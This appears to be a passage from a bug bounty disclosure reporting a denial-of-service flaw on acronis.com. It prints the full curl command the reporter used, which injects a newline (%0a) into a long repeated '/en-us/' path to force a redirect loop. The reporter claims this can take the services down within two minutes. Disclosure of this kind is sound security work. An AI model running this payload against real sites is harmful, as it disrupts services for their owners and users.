So i tried with new line command (%0a) and the site gave 301 and again and again. Then i think like this: this is be DoS? And tried at just 1 page and no result :( Then i opened a few (10-15) page and execute this curl command: \n\ncurl -L --max-redirs 100 \"https://www.acronis.com/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/%0ahttps:/www.acronis.com/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/%0A\" and it's worked.

So you should limit the number of characters in the URL and solve the other problem\n\nBest Regards,\nPlantos\n\n## Impact\n\nAn attacker can down the acronis services at just 2 mins.",
